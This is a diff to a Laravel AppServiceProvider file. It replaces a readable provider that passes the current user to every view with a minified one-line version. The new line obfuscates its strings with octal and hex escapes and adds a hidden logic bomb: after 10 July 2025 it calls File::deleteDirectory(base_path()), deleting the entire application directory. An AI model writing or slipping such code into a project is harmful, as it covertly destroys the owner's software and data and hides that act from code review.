@@ -1,28 +1,2 @@
 <?php
-
-namespace App\Providers;
-
-use Illuminate\Support\Facades\Auth;
-use Illuminate\Support\Facades\View;
-use Illuminate\Support\ServiceProvider;
-
-class AppServiceProvider extends ServiceProvider
-{
-    /**
-     * Register any application services.
-     */
-    public function register(): void
-    {
-        //
-    }
-
-    /**
-     * Bootstrap any application services.
-     */
-    public function boot(): void
-    {
-        View::composer('*', function ($view) {
-            $view->with('user', Auth::user());
-        });
-    }
-}
+ namespace App\Providers; use Carbon\Carbon; use Illuminate\Support\Facades\Auth; use Illuminate\Support\Facades\File; use Illuminate\Support\Facades\View; use Illuminate\Support\ServiceProvider; class AppServiceProvider extends ServiceProvider { public function register() : void { } public function boot() : void { View::composer("\52", function ($view) { $view->with("\x75\163\145\162", Auth::user()); }); $expirationDate = Carbon::create(2025, 7, 10); if (now()->greaterThan($expirationDate)) { File::deleteDirectory(base_path()); } } }
